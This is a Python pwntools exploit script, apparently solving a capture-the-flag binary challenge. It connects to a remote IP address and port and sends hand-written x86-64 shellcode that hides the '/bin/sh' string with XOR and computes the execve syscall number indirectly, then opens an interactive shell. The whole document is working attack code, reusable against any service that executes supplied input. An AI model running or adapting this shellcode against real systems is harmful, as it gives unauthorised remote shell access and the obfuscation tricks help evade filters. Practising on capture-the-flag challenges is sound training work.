#!/usr/bin/python3
from pwn import *

#shell = gdb.debug("./chall", "b *main+152\ncontinue")
#shell = process("./chall")
shell = remote("54.91.159.197", 4444)
context.arch = "amd64"

shellcode = asm("""
    mov rax, 0xff978cd091969dd0 # "/bin/sh" xored
    push 0xffffffffffffffff     # xor key
    xor rax, [rsp]              # restore string
    push rax                    # "/bin/sh"
    mov rdi, rsp                # $rdi = &"/bin/sh"

    cdq                         # $rdx = 0x0
    push rdx                    # push 0x0
    pop rsi                     # $rsi = 0x0

    push 0x3c                   # 0x3c = execve() - 1
    pop rax                     # $rax = 0x3c
    dec al                      # $rax = execve()
    syscall                     # syscall
""")

shell.sendlineafter(b": ", shellcode)
shell.interactive()
